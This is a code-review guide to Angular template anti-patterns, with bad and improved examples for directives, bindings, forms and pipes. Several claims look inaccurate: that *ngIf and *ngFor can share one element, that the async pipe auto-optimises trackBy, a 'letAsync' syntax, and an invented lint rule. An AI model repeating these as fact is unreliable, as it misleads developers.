# Angular Template Anti-Patterns: A Senior Engineer's Code Review Guide

## Overview

This guide documents common anti-patterns found in Angular templates, organized by category. Each anti-pattern includes diagnosis, consequences, examples, and solutions aligned with modern Angular (v15+) best practices.

---

## 1. STRUCTURAL DIRECTIVES

### 1.1 Nested *ngIf for Null/Undefined Checks

**Name:** Deeply Nested Conditional Guards

**Short Description:** Using multiple levels of `*ngIf` to check for null/undefined values before accessing nested properties, creating pyramid-of-doom code.

**Why It's Bad:**
- **Readability:** Deeply nested code is harder to follow and maintain
- **Performance:** Each condition creates a new context; excessive DOM operations
- **Testability:** Difficult to test all conditional branches
- **DX:** Error-prone when properties can be null at multiple levels

**Typical Symptoms:**
```html
<!-- Multiple indentation levels, hard to track closing tags -->
<div *ngIf="user">
  <div *ngIf="user.profile">
    <div *ngIf="user.profile.settings">
      {{ user.profile.settings.theme }}
    </div>
  </div>
</div>
```

**Bad Example:**
```html
<!-- Pyramid of doom -->
<div *ngIf="data">
  <div *ngIf="data.user">
    <div *ngIf="data.user.preferences">
      <p>{{ data.user.preferences.language }}</p>
    </div>
  </div>
</div>
```

**Better Fixes:**

*Option 1: Safe Navigation Operator (Simple cases)*
```html
<p>{{ data?.user?.preferences?.language }}</p>
```

*Option 2: Use Let Syntax (Cleaner, v16+)*
```html
<div *ngIf="data?.user?.preferences as prefs">
  <p>{{ prefs.language }}</p>
</div>
```

*Option 3: Async Pipe with Observable (Reactive)*
```html
<div *ngIf="userPreferences$ | async as prefs">
  <p>{{ prefs.language }}</p>
</div>
```

*Option 4: Computed Signal (Modern, v17+)*
```typescript
// Component
userLanguage = computed(() => {
  const data = this.data();
  return data?.user?.preferences?.language ?? 'en';
});
```
```html
<p>{{ userLanguage() }}</p>
```

**Notes for Modern Angular:**
- Prefer **safe navigation operator** (`?.`) for simple cases
- Use **let syntax** with `*ngIf` to keep scope flat (v16+)
- With **strict templates enabled**, TypeScript ensures null-safety before template
- **Signals and computed()** eliminate null-checking boilerplate (v17+)
- Consider **non-null assertion operator** (`!`) only when you're certain a value exists

**Recommended Lint Rules:**
```json
{
  "@angular-eslint/template/no-negated-async": "error",
  "@angular-eslint/template/use-track-by-function": "error"
}
```

---

### 1.2 *ngIf with *ngFor on Same Element

**Name:** Combined Structural Directives

**Short Description:** Using both `*ngIf` and `*ngFor` on the same element, causing performance and behavioral issues.

**Why It's Bad:**
- **Performance:** Angular creates a template instance for the entire collection first, then filters with `*ngIf`
- **Correctness:** Unpredictable behavior; `*ngIf` evaluates after `*ngFor`, wasting DOM operations
- **Memory:** Unnecessary DOM nodes created and destroyed
- **Maintainability:** Logic mixed with template structure

**Typical Symptoms:**
```html
<!-- Both directives competing for control flow -->
<div *ngIf="isVisible" *ngFor="let item of items">
  {{ item.name }}
</div>
```

**Bad Example:**
```html
<ul>
  <!-- Creates nodes for ALL items, then conditionally hides container -->
  <li *ngIf="items.length > 0" *ngFor="let item of items">
    {{ item.name }}
  </li>
</ul>
```

**Better Fixes:**

*Option 1: Wrapper with *ngIf*
```html
<ul *ngIf="items.length > 0">
  <li *ngFor="let item of items">
    {{ item.name }}
  </li>
</ul>
```

*Option 2: Filter with ngFor (Logic in Component)*
```typescript
export class ListComponent {
  @Input() items: Item[] = [];
  filteredItems = computed(() => 
    this.items.filter(item => item.isActive)
  );
}
```
```html
<li *ngFor="let item of filteredItems()">
  {{ item.name }}
</li>
```

*Option 3: Use @if and @for Control Flow (v17+)*
```html
@if (items.length > 0) {
  <ul>
    @for (item of items; track item.id) {
      <li>{{ item.name }}</li>
    }
  </ul>
}
```

**Notes for Modern Angular:**
- **v17+:** Use `@if` and `@for` control flow syntax; they handle precedence correctly
- **Computed properties** in component are preferred for complex filtering
- Always move the filtering logic to the component when possible
- Use **RxJS `filter()` operator** in observables: `items$ = this.itemService.getItems().pipe(filter(...))`

**Recommended Lint Rules:**
```json
{
  "@angular-eslint/template/no-negated-async": "error"
}
```

---

### 1.3 Missing trackBy in *ngFor

**Name:** Inefficient List Rendering Without Identity Tracking

**Short Description:** Using `*ngFor` without `trackBy` function, causing Angular to recreate all DOM nodes on list changes.

**Why It's Bad:**
- **Performance:** O(n) DOM operations on every list change; very slow with large lists
- **UX:** Input fields lose focus, animations restart, scroll position resets
- **Change Detection:** Expensive diffing algorithm runs on all items
- **Accessibility:** Screen reader state resets

**Typical Symptoms:**
```html
<!-- Simple ngFor without trackBy -->
<div *ngFor="let item of items">
  <input [(ngModel)]="item.name"> <!-- Loses focus on list update -->
</div>
```

**Bad Example:**
```html
<ul>
  <li *ngFor="let user of users">
    <input [(ngModel)]="user.name">
    {{ user.email }}
  </li>
</ul>
```

If `users` list updates, all inputs lose focus and state is lost.

**Better Fix:**

```typescript
export class UserListComponent {
  @Input() users: User[] = [];
  
  trackByUserId(index: number, user: User): string | number {
    return user.id; // Return unique identifier
  }
}
```

```html
<ul>
  <li *ngFor="let user of users; trackBy: trackByUserId">
    <input [(ngModel)]="user.name">
    {{ user.email }}
  </li>
</ul>
```

**Modern Angular (v17+):**
```html
@for (user of users; track user.id) {
  <li>
    <input [(ngModel)]="user.name">
    {{ user.email }}
  </li>
}
```

**Notes for Modern Angular:**
- **v17+:** `track` is **mandatory** in `@for`; Angular will warn if missing
- **trackBy function** should return a **primitive value** (string, number) or unique object reference
- Never use **array index** as trackBy result if list is mutable: `track i` is anti-pattern
- For server-paginated lists, track by **unique ID** from backend (not index)
- **RxJS async pipe** automatically handles trackBy optimization when combined with `OnPush`

**Recommended Lint Rules:**
```json
{
  "@angular-eslint/template/use-track-by-function": "error"
}
```

**Best Practices Checklist:**
- ✅ TrackBy function returns stable, unique identifier
- ✅ Never track by index for dynamic lists
- ✅ Keep trackBy function pure (no side effects)
- ✅ Memoize trackBy using `trackBy: this.trackByUserId` (bound method)

---

## 2. DATA BINDING & EXPRESSIONS

### 2.1 Complex Logic in Templates (Computed Properties Inline)

**Name:** Template Logic Overload

**Short Description:** Writing complex calculations, transformations, or business logic directly in template expressions instead of component logic.

**Why It's Bad:**
- **Maintainability:** Logic scattered across templates; hard to test or refactor
- **Performance:** Expressions re-evaluate on every change detection cycle
- **Testability:** Can't unit test template logic separately
- **Reusability:** Logic locked in template; can't share across components
- **DX:** Harder to debug template expressions than component methods
- **Readability:** Templates become cluttered with business logic

**Typical Symptoms:**
```html
<!-- Complex expressions inline -->
{{ user.firstName.toUpperCase() + ' ' + user.lastName.toUpperCase() }}
{{ (order.total * order.taxRate) + order.shippingCost }}
{{ items.filter(i => i.active).map(i => i.value).reduce((a,b) => a + b, 0) }}
```

**Bad Example:**
```html
<div class="user-card">
  <!-- Multiple operations inline -->
  <h2>{{ (user.firstName + ' ' + user.lastName).toUpperCase() }}</h2>
  <p>{{ user.email.toLowerCase() }}</p>
  <span>{{ (order.items.length > 0 ? order.items.reduce((sum, item) => sum + (item.price * item.qty), 0) * 1.15 : 0).toFixed(2) }}</span>
</div>
```

**Better Fixes:**

*Option 1: Component Methods (Simple)*
```typescript
export class UserCardComponent {
  @Input() user!: User;
  @Input() order!: Order;
  
  getFullName(): string {
    return `${this.user.firstName} ${this.user.lastName}`.toUpperCase();
  }
  
  calculateTotal(): number {
    if (this.order.items.length === 0) return 0;
    const subtotal = this.order.items.reduce((sum, item) => sum + (item.price * item.qty), 0);
    return Math.round(subtotal * 1.15 * 100) / 100;
  }
}
```
```html
<div class="user-card">
  <h2>{{ getFullName() }}</h2>
  <p>{{ user.email.toLowerCase() }}</p>
  <span>{{ calculateTotal() | currency }}</span>
</div>
```

*Option 2: Signals/Computed (Modern, v17+)*
```typescript
export class UserCardComponent {
  user = input.required<User>();
  order = input.required<Order>();
  
  fullName = computed(() => 
    `${this.user().firstName} ${this.user().lastName}`.toUpperCase()
  );
  
  totalWithTax = computed(() => {
    const items = this.order().items;
    if (items.length === 0) return 0;
    const subtotal = items.reduce((sum, item) => sum + (item.price * item.qty), 0);
    return Math.round(subtotal * 1.15 * 100) / 100;
  });
}
```
```html
<div class="user-card">
  <h2>{{ fullName() }}</h2>
  <p>{{ user().email.toLowerCase() }}</p>
  <span>{{ totalWithTax() | currency }}</span>
</div>
```

*Option 3: Observables with async Pipe (Reactive)*
```typescript
export class UserCardComponent {
  @Input() set user(value: User) { this.user$.next(value); }
  @Input() set order(value: Order) { this.order$.next(value); }
  
  private user$ = new BehaviorSubject<User | null>(null);
  private order$ = new BehaviorSubject<Order | null>(null);
  
  fullName$ = this.user$.pipe(
    map(user => user ? `${user.firstName} ${user.lastName}`.toUpperCase() : ''),
    shareReplay(1)
  );
  
  totalWithTax$ = this.order$.pipe(
    map(order => {
      if (!order?.items?.length) return 0;
      const subtotal = order.items.reduce((sum, item) => sum + (item.price * item.qty), 0);
      return Math.round(subtotal * 1.15 * 100) / 100;
    }),
    shareReplay(1)
  );
}
```
```html
<div class="user-card">
  <h2>{{ (fullName$ | async)?.toUpperCase() }}</h2>
  <p>{{ (user$ | async)?.email.toLowerCase() }}</p>
  <span>{{ (totalWithTax$ | async) | currency }}</span>
</div>
```

**Notes for Modern Angular:**
- **Computed signals** (v17+) are the preferred approach; replace complex observables
- **Memoization:** Component methods are NOT memoized; computed signals are—use signals for expensive calculations
- **Change detection:** With `OnPush`, only computed signals trigger re-evaluation when inputs change
- **Readability:** Keep templates as simple as possible; delegate logic to component
- **Testing:** Extract logic to testable methods/computed properties

**Recommended Lint Rules:**
```json
{
  "@angular-eslint/template/no-call-expression": "warn",
  "no-complex-template-expressions": "error"
}
```

**Best Practices Checklist:**
- ✅ Expressions in templates should be simple property access or method calls
- ✅ Keep methods in component pure (no side effects)
- ✅ Use computed signals for memoized calculations
- ✅ Testable logic lives in component, not template

---

### 2.2 Two-Way Binding with Objects ([(ngModel)])

**Name:** Mutable Object Binding

**Short Description:** Using two-way binding `[(ngModel)]` with nested object properties, causing unexpected behavior and breaking OnPush change detection.

**Why It's Bad:**
- **Change Detection:** OnPush doesn't detect mutations inside objects; component state falls out of sync
- **Immutability:** Breaks reactive programming patterns; difficult to track changes
- **Performance:** Changes don't propagate correctly with ChangeDetectionStrategy.OnPush
- **Testability:** Hard to verify mutation order and timing
- **Reactivity:** Observable streams don't detect nested mutations
- **Debugging:** Silent failures when changes don't propagate

**Typical Symptoms:**
```typescript
export class FormComponent implements OnInit {
  @Input() user!: User; // Object reference
  // User's nested properties are mutated, but parent doesn't detect change
}
```
```html
<!-- Two-way bind directly to nested object -->
<input [(ngModel)]="user.address.street">
<!-- Parent component with OnPush won't see this mutation -->
```

**Bad Example:**
```typescript
// Parent with OnPush
@Component({
  selector: 'app-parent',
  changeDetection: ChangeDetectionStrategy.OnPush
})
export class ParentComponent {
  user: User = { name: 'John', address: { street: 'Main St' } };
}
```
```html
<!-- Child component mutates user.address directly -->
<input [(ngModel)]="user.address.street">
<!-- Parent won't see this change -->
```

**Better Fixes:**

*Option 1: Event Binding + Immutability*
```typescript
export class AddressFormComponent {
  @Input() address!: Address;
  @Output() addressChange = new EventEmitter<Address>();
  
  onStreetChange(street: string): void {
    // Create new object, don't mutate
    const updated = { ...this.address, street };
    this.addressChange.emit(updated);
  }
}
```
```html
<input 
  [value]="address.street"
  (change)="onStreetChange($event.target.value)">
```

*Option 2: Banana-in-a-Box with Immutability (v14+)*
```typescript
export class AddressFormComponent {
  @Input() address!: Address;
  @Output() addressChange = new EventEmitter<Address>();
  
  updateAddress(changes: Partial<Address>): void {
    this.addressChange.emit({ ...this.address, ...changes });
  }
}
```
```html
<input 
  [ngModel]="address.street"
  (ngModelChange)="updateAddress({ street: $event })">
```

*Option 3: Reactive Forms (Recommended)*
```typescript
export class AddressFormComponent implements OnInit {
  @Input() initialAddress!: Address;
  @Output() addressChange = new EventEmitter<Address>();
  
  form!: FormGroup;
  
  constructor(private fb: FormBuilder) {}
  
  ngOnInit(): void {
    this.form = this.fb.group({
      street: [this.initialAddress.street, Validators.required],
      city: [this.initialAddress.city, Validators.required]
    });
    
    this.form.valueChanges
      .pipe(takeUntilDestroyed(this.destroyRef))
      .subscribe(value => this.addressChange.emit(value));
  }
}
```
```html
<form [formGroup]="form">
  <input formControlName="street">
  <input formControlName="city">
</form>
```

*Option 4: Signals (v17+)*
```typescript
export class AddressFormComponent {
  address = input.required<Address>();
  addressChange = output<Address>();
  
  street = signal('');
  
  ngOnInit(): void {
    this.street.set(this.address().street);
  }
  
  updateStreet(value: string): void {
    this.street.set(value);
    this.addressChange.emit({ ...this.address(), street: value });
  }
}
```
```html
<input 
  [value]="street()"
  (change)="updateStreet($event.target.value)">
```

**Notes for Modern Angular:**
- **Reactive Forms** are preferred over two-way binding; better for complex forms
- **OnPush** + mutable bindings = silent failures; always use immutable patterns
- **Signals** provide reactive state without Observable boilerplate (v17+)
- **Never mutate input objects** directly; emit changes through @Output or Form API
- For simple display, use **property binding** `[property]="value"` instead of `[(ngModel)]`

**Recommended Lint Rules:**
```json
{
  "@angular-eslint/template/no-negated-async": "error",
  "no-two-way-binding-on-inputs": "error"
}
```

**Best Practices Checklist:**
- ✅ Use Reactive Forms for anything beyond simple inputs
- ✅ Emit immutable copies through @Output
- ✅ Never rely on mutation with OnPush detection
- ✅ Prefer signals over observables for mutable state (v17+)

---

### 2.3 No Null Safety (Strict Templates Not Enabled)

**Name:** Unsafe Property Access

**Short Description:** Accessing properties that may be null/undefined without strict template checking or safe navigation operators.

**Why It's Bad:**
- **Runtime Errors:** "Cannot read property X of undefined" crashes
- **Correctness:** Templates render incorrectly with null values
- **DX:** Errors caught in production instead of development
- **Maintenance:** Refactoring is error-prone without static checks
- **Testing:** Edge cases with null values aren't caught during development

**Typical Symptoms:**
```html
<!-- No null check, no safe navigation -->
<p>{{ user.profile.name }}</p>
<!-- If user or profile is null, template crashes -->
```

**Bad Example:**
```typescript
export class UserDetailComponent {
  user: User; // Could be undefined initially
  
  ngOnInit(): void {
    this.userService.getUser(123).subscribe(u => this.user = u);
  }
}
```
```html
<div>
  <!-- user might be undefined here, will crash on load -->
  <h1>{{ user.name }}</h1>
  <p>{{ user.profile.bio }}</p>
</div>
```

**Better Fixes:**

*Option 1: Strict Templates + Safe Navigation*
```typescript
// tsconfig.json
{
  "angularCompilerOptions": {
    "strictTemplates": true
  }
}
```
```typescript
export class UserDetailComponent {
  user$: Observable<User | undefined>;
  
  constructor(private userService: UserService) {
    this.user$ = this.userService.getUser(123);
  }
}
```
```html
<div *ngIf="user$ | async as user">
  <h1>{{ user.name }}</h1>
  <p>{{ user.profile.bio }}</p>
</div>
```

*Option 2: Input with Type Guard*
```typescript
export class UserDetailComponent {
  @Input() user: User | null = null;
}
```
```html
<!-- Strict templates will error if user could be null -->
<div *ngIf="user">
  <h1>{{ user.name }}</h1>
</div>
```

*Option 3: Signals with Strict Typing (v17+)*
```typescript
export class UserDetailComponent {
  user = input<User | null>(null);
  userNonNull = computed(() => {
    const u = this.user();
    return u ? u : null;
  });
}
```
```html
@if (user(); as u) {
  <h1>{{ u.name }}</h1>
}
```

**Notes for Modern Angular:**
- **Enable `strictTemplates: true`** in tsconfig.json (v12+); catches null errors at compile time
- **Strict mode** is now default in Angular v14+ new projects
- Safe navigation operator (`?.`) is essential without strict templates
- **Input validation:** Use Input with union types like `Input<User | null>`

**Recommended Lint Rules:**
```json
{
  "compilerOptions": {
    "strict": true
  },
  "angularCompilerOptions": {
    "strictTemplates": true,
    "strictAttributeTypes": true,
    "strictSafeNavigationTypes": true,
    "strictDomLocalRefTypes": true,
    "strictOutputEventTypes": true,
    "strictDomEventTypes": true
  }
}
```

**Best Practices Checklist:**
- ✅ Enable `strictTemplates: true` in tsconfig.json
- ✅ Use safe navigation operator (`?.`) as fallback
- ✅ Handle null/undefined explicitly with *ngIf or @if
- ✅ Type inputs properly: `Input<User | null>()`

---

## 3. FORMS

### 3.1 Template-Driven Forms for Complex Forms

**Name:** Insufficient Form Architecture

**Short Description:** Using template-driven forms (`[(ngModel)]`) for complex, multi-step, or dynamically generated forms instead of Reactive Forms.

**Why It's Bad:**
- **Scalability:** Difficult to manage many form fields
- **Validation:** Complex validation logic scattered across template and component
- **Testing:** Hard to unit test form logic without component instantiation
- **Dynamic Forms:** Adding/removing fields at runtime is cumbersome
- **Async Validation:** Limited support for async validators
- **Error Handling:** Error state management becomes complex

**Typical Symptoms:**
```html
<!-- Many [(ngModel)] bindings, validation inline -->
<form>
  <input [(ngModel)]="formData.field1" name="field1">
  <input [(ngModel)]="formData.field2" name="field2">
  <input [(ngModel)]="formData.field3" name="field3">
  <!-- Complex error display logic -->
  <span *ngIf="submitted && !formData.field1">Required</span>
</form>
```

**Bad Example:**
```typescript
export class RegistrationComponent {
  formData = {
    firstName: '',
    lastName: '',
    email: '',
    password: '',
    confirmPassword: ''
  };
  submitted = false;
  
  onSubmit(): void {
    this.submitted = true;
    if (!this.validate()) return;
    this.submit();
  }
  
  validate(): boolean {
    // Manual validation logic
    return this.formData.firstName.length > 0 &&
           this.formData.email.includes('@') &&
           this.formData.password === this.formData.confirmPassword;
  }
}
```

**Better Fix:**

```typescript
export class RegistrationComponent implements OnInit {
  form!: FormGroup;
  submitted = false;
  
  constructor(private fb: FormBuilder, private authService: AuthService) {}
  
  ngOnInit(): void {
    this.form = this.fb.group(
      {
        firstName: ['', [Validators.required, Validators.minLength(2)]],
        lastName: ['', [Validators.required, Validators.minLength(2)]],
        email: ['', [Validators.required, Validators.email], [this.emailValidator.bind(this)]],
        password: ['', [Validators.required, Validators.minLength(8)]],
        confirmPassword: ['', Validators.required]
      },
      { validators: this.passwordMatchValidator }
    );
  }
  
  passwordMatchValidator(group: AbstractControl): ValidationErrors | null {
    const password = group.get('password')?.value;
    const confirmPassword = group.get('confirmPassword')?.value;
    return password === confirmPassword ? null : { passwordMismatch: true };
  }
  
  emailValidator(control: AbstractControl): Observable<ValidationErrors | null> {
    if (!control.value) return of(null);
    return this.authService.checkEmailExists(control.value).pipe(
      map(exists => exists ? { emailTaken: true } : null),
      catchError(() => of(null))
    );
  }
  
  onSubmit(): void {
    this.submitted = true;
    if (this.form.invalid) return;
    this.authService.register(this.form.value).subscribe(...);
  }
  
  getFieldError(fieldName: string): string {
    const control = this.form.get(fieldName);
    if (!control?.errors || !control?.touched) return '';
    if (control.errors['required']) return 'This field is required';
    if (control.errors['email']) return 'Invalid email format';
    if (control.errors['minlength']) {
      const min = control.errors['minlength'].requiredLength;
      return `Minimum ${min} characters required`;
    }
    return '';
  }
}
```

```html
<form [formGroup]="form" (ngSubmit)="onSubmit()">
  <div class="form-group">
    <label for="firstName">First Name</label>
    <input 
      id="firstName"
      formControlName="firstName"
      type="text"
      class="form-control"
      [class.is-invalid]="submitted && form.get('firstName')?.invalid">
    <div class="invalid-feedback" 
         *ngIf="submitted && form.get('firstName')?.invalid">
      {{ getFieldError('firstName') }}
    </div>
  </div>
  
  <div class="form-group">
    <label for="email">Email</label>
    <input 
      id="email"
      formControlName="email"
      type="email"
      class="form-control"
      [class.is-invalid]="submitted && form.get('email')?.invalid">
    <div class="invalid-feedback" 
         *ngIf="submitted && form.get('email')?.invalid">
      {{ getFieldError('email') }}
    </div>
  </div>
  
  <div class="form-group">
    <label for="password">Password</label>
    <input 
      id="password"
      formControlName="password"
      type="password"
      class="form-control"
      [class.is-invalid]="submitted && form.get('password')?.invalid">
  </div>
  
  <div class="form-group">
    <label for="confirmPassword">Confirm Password</label>
    <input 
      id="confirmPassword"
      formControlName="confirmPassword"
      type="password"
      class="form-control"
      [class.is-invalid]="submitted && (form.get('confirmPassword')?.invalid || form.errors?.['passwordMismatch'])">
    <div class="invalid-feedback" 
         *ngIf="submitted && form.errors?.['passwordMismatch']">
      Passwords do not match
    </div>
  </div>
  
  <button type="submit" class="btn btn-primary" [disabled]="form.pending">
    {{ form.pending ? 'Creating account...' : 'Register' }}
  </button>
</form>
```

**Modern Angular (v17+ with Signals):**

```typescript
export class RegistrationComponent implements OnInit {
  form!: FormGroup;
  submitted = signal(false);
  
  onSubmit(): void {
    this.submitted.set(true);
    if (this.form.invalid) return;
    // Submit logic
  }
  
  getFieldError = (fieldName: string): string => {
    const control = this.form.get(fieldName);
    if (!control?.errors || !control?.touched) return '';
    // Error mapping logic
    return '';
  };
}
```

**Notes for Modern Angular:**
- **Reactive Forms** are recommended for all forms beyond trivial ones
- **FormBuilder** provides fluent API for building forms
- **Validators** include built-in (required, email, min/max) and custom validators
- **Async validators** for server-side checks (email exists, username taken)
- **Cross-field validation** using group validators
- **FormArray** for dynamic field collections
- With **strict templates**, type safety is enforced on form controls

**Recommended Lint Rules:**
```json
{
  "@angular-eslint/template/no-negated-async": "error"
}
```

**Best Practices Checklist:**
- ✅ Use Reactive Forms for anything beyond simple single-field inputs
- ✅ Separate validation logic from template
- ✅ Use FormBuilder for concise form definition
- ✅ Implement custom validators for domain-specific rules
- ✅ Handle async validation with proper loading states

---

### 3.2 Form State Not Cleared After Submission

**Name:** Stale Form State

**Short Description:** Form remains filled with old data after successful submission, or reset functionality is missing.

**Why It's Bad:**
- **UX:** User sees previously submitted data when creating a new record
- **Data Entry:** Risk of accidentally resubmitting old data
- **Accessibility:** Screen readers can't distinguish between old and new form
- **Testing:** Manual testing requires clearing form manually

**Typical Symptoms:**
```typescript
onSubmit(): void {
  if (this.form.invalid) return;
  this.service.save(this.form.value).subscribe(() => {
    this.showSuccess = true;
    // Form is NOT reset; still shows old data
  });
}
```

**Bad Example:**
```typescript
export class UserFormComponent {
  form = this.fb.group({
    name: ['', Validators.required],
    email: ['', [Validators.required, Validators.email]]
  });
  
  constructor(private fb: FormBuilder, private userService: UserService) {}
  
  onSubmit(): void {
    if (this.form.invalid) return;
    this.userService.createUser(this.form.value).subscribe(
      (newUser) => {
        console.log('User created:', newUser);
        // Form still contains old data—ready for next submission
      }
    );
  }
}
```

**Better Fix:**

```typescript
export class UserFormComponent {
  form = this.fb.group({
    name: ['', Validators.required],
    email: ['', [Validators.required, Validators.email]]
  });
  
  isSubmitting = signal(false);
  successMessage = signal<string | null>(null);
  
  constructor(private fb: FormBuilder, private userService: UserService) {}
  
  onSubmit(): void {
    if (this.form.invalid) return;
    
    this.isSubmitting.set(true);
    this.userService.createUser(this.form.value).subscribe({
      next: (newUser) => {
        this.successMessage.set(`User ${newUser.name} created successfully`);
        this.form.reset(); // Clear form after successful submission
        this.isSubmitting.set(false);
        
        // Optional: Show message for 3 seconds then clear
        setTimeout(() => this.successMessage.set(null), 3000);
      },
      error: (error) => {
        console.error('Error creating user:', error);
        this.isSubmitting.set(false);
      }
    });
  }
  
  resetForm(): void {
    this.form.reset();
    this.successMessage.set(null);
  }
}
```

```html
<form [formGroup]="form" (ngSubmit)="onSubmit()">
  @if (successMessage(); as message) {
    <div class="alert alert-success">{{ message }}</div>
  }
  
  <div class="form-group">
    <label for="name">Name</label>
    <input 
      id="name"
      formControlName="name"
      type="text"
      class="form-control">
  </div>
  
  <div class="form-group">
    <label for="email">Email</label>
    <input 
      id="email"
      formControlName="email"
      type="email"
      class="form-control">
  </div>
  
  <button 
    type="submit" 
    class="btn btn-primary"
    [disabled]="form.invalid || isSubmitting()">
    {{ isSubmitting() ? 'Creating...' : 'Create User' }}
  </button>
  
  <button 
    type="button"
    class="btn btn-secondary"
    (click)="resetForm()">
    Clear Form
  </button>
</form>
```

**Notes for Modern Angular:**
- Call **`form.reset()`** after successful submission
- **Optional:** reset to initial values: `form.reset(this.initialValue)`
- Show **success message** with timeout to clear
- **Disable submit button** while request is pending (`[disabled]="form.pending"`)
- Use **signals** to track submission state clearly

**Best Practices Checklist:**
- ✅ Reset form after successful submission
- ✅ Show success/error feedback
- ✅ Disable button during submission
- ✅ Handle errors gracefully without clearing form

---

## 4. PIPES

### 4.1 Heavy Computation in Custom Pipes (Impure Pipes)

**Name:** Expensive Impure Pipe Execution

**Short Description:** Creating impure pipes or using pipes for expensive computations, causing them to run excessively during change detection.

**Why It's Bad:**
- **Performance:** Impure pipes run on every change detection cycle (even unrelated events)
- **CPU Usage:** Expensive computations executed 100s of times per second
- **Memory:** Repeated calculations instead of caching
- **DX:** Unclear when pipe runs; difficult to optimize

**Typical Symptoms:**
```typescript
@Pipe({
  name: 'expensiveFilter',
  pure: false // Impure—runs every digest cycle
})
export class ExpensiveFilterPipe implements PipeTransform {
  transform(items: Item[], filter: string): Item[] {
    // Expensive computation runs on EVERY change detection
    return items.filter(item => complexAlgorithm(item, filter));
  }
}
```

**Bad Example:**
```typescript
@Pipe({
  name: 'sortAndFilter',
  pure: false
})
export class SortAndFilterPipe implements PipeTransform {
  transform(items: Item[], sortBy: string, filterBy: string): Item[] {
    // This runs EVERY change detection cycle, not just when inputs change
    return items
      .filter(item => item.type === filterBy)
      .sort((a, b) => a[sortBy].localeCompare(b[sortBy]));
  }
}
```

```html
<!-- Pipe runs on every change detection -->
<div>{{ items | sortAndFilter: sortField: filterField }}</div>
```

**Better Fixes:**

*Option 1: Component Logic with Computed Signal (Recommended)*
```typescript
export class ItemListComponent {
  items = input.required<Item[]>();
  sortBy = input<string>('name');
  filterBy = input<string>('all');
  
  filteredAndSorted = computed(() => {
    const items = this.items();
    const sort = this.sortBy();
    const filter = this.filterBy();
    
    return items
      .filter(item => filter === 'all' || item.type === filter)
      .sort((a, b) => a[sort].localeCompare(b[sort]));
  });
}
```

```html
@for (item of filteredAndSorted(); track item.id) {
  <div>{{ item.name }}</div>
}
```

*Option 2: Pure Pipe (If pipe is necessary)*
```typescript
@Pipe({
  name: 'sortAndFilter',
  pure: true // Pure—only runs when inputs change
})
export class SortAndFilterPipe implements PipeTransform {
  transform(items: Item[], sortBy: string, filterBy: string): Item[] {
    // Only runs when items, sortBy, or filterBy change (by reference)
    return items
      .filter(item => filterBy === 'all' || item.type === filterBy)
      .sort((a, b) => a[sortBy].localeCompare(b[sortBy]));
  }
}
```

**Important Note:** For pure pipes to work correctly, you must pass **new array references** when data changes:
```typescript
// This won't trigger pure pipe because array reference doesn't change
this.items[0].name = 'Updated';

// This will trigger pipe—new array reference
this.items = [...this.items];
```

*Option 3: OnPush with Observable Pipe*
```typescript
export class ItemListComponent implements OnInit {
  @Input() items$!: Observable<Item[]>;
  @Input() sortBy$!: Observable<string>;
  @Input() filterBy$!: Observable<string>;
  
  filteredAndSorted$ = combineLatest([this.items$, this.sortBy$, this.filterBy$]).pipe(
    map(([items, sort, filter]) => 
      items
        .filter(item => filter === 'all' || item.type === filter)
        .sort((a, b) => a[sort].localeCompare(b[sort]))
    ),
    shareReplay(1)
  );
}
```

```html
<div *ngFor="let item of (filteredAndSorted$ | async)">
  {{ item.name }}
</div>
```

**Notes for Modern Angular:**
- **Prefer component logic** over pipes for anything beyond simple display formatting
- **Pure pipes** (default) only run when inputs change by reference
- **Impure pipes** run every change detection cycle—avoid except for trivial pipes
- **Computed signals** are ideal for derived data; they memoize results
- **OnPush change detection** with pure pipes is a powerful optimization

**Recommended Lint Rules:**
```json
{
  "@angular-eslint/template/no-call-expression": "warn"
}
```

**Best Practices Checklist:**
- ✅ Use pure pipes by default
- ✅ Move expensive logic to component methods or signals
- ✅ Never use impure pipes for computation
- ✅ Test pipe performance with large datasets
- ✅ Consider observable chains for async data transformation

---

### 4.2 Async Pipe Creating Multiple Subscriptions

**Name:** Multiple Async Pipe Subscriptions

**Short Description:** Using the async pipe multiple times on the same observable, creating duplicate subscriptions and network requests.

**Why It's Bad:**
- **Performance:** Multiple subscriptions = multiple HTTP requests or duplicate computation
- **Memory:** Extra subscriptions consume memory and resources
- **Consistency:** Multiple subscribers may receive different values if source is hot
- **Side Effects:** Network requests, database queries, etc., executed multiple times

**Typical Symptoms:**
```html
<!-- Same observable piped multiple times = multiple subscriptions -->
<p>{{ user$ | async | json }}</p>
<p>Name: {{ user$ | async }}</p> <!-- Second subscription! -->
<p>Email: {{ (user$ | async)?.email }}</p> <!-- Third subscription! -->
```

**Bad Example:**
```typescript
export class UserProfileComponent {
  user$ = this.userService.getUser(123); // Single HTTP request observable
}
```

```html
<div>
  <!-- Creates 3 separate subscriptions; 3 HTTP requests! -->
  <h1>{{ user$ | async | json }}</h1>
  <p>Name: {{ (user$ | async)?.name }}</p>
  <p>Email: {{ (user$ | async)?.email }}</p>
</div>
```

**Better Fixes:**

*Option 1: Single Subscription with let*
```html
<div *ngIf="user$ | async as user">
  <h1>{{ user | json }}</h1>
  <p>Name: {{ user.name }}</p>
  <p>Email: {{ user.email }}</p>
</div>
```

*Option 2: shareReplay in Component (Recommended)*
```typescript
export class UserProfileComponent implements OnInit {
  user$!: Observable<User>;
  
  constructor(private userService: UserService) {}
  
  ngOnInit(): void {
    this.user$ = this.userService.getUser(123).pipe(
      shareReplay(1) // Cache the single subscription result
    );
  }
}
```

```html
<div *ngIf="user$ | async as user">
  <h1>{{ user | json }}</h1>
  <p>Name: {{ user.name }}</p>
  <p>Email: {{ user.email }}</p>
</div>
```

*Option 3: takeUntilDestroyed with OnPush (Modern)*
```typescript
export class UserProfileComponent implements OnInit {
  private destroyRef = inject(DestroyRef);
  
  user$ = this.userService.getUser(123).pipe(
    shareReplay(1),
    takeUntilDestroyed(this.destroyRef)
  );
}
```

*Option 4: Signals (v17+, Simplest)*
```typescript
export class UserProfileComponent {
  userId = input.required<number>();
  
  user = resource({
    request: () => this.userId(),
    loader: ({ request }) => this.userService.getUser(request)
  });
}
```

```html
@switch (user.status()) {
  @case ('pending') {
    <p>Loading...</p>
  }
  @case ('error') {
    <p>Error loading user</p>
  }
  @case ('success') {
    <div>
      <h1>{{ user.value()?.name }}</h1>
      <p>Email: {{ user.value()?.email }}</p>
    </div>
  }
}
```

**Notes for Modern Angular:**
- **Always use `shareReplay(1)`** when returning observables from component
- **`letAsync` variable syntax** scopes subscription to single binding
- **Signals** (v17+) eliminate async pipe complexity entirely
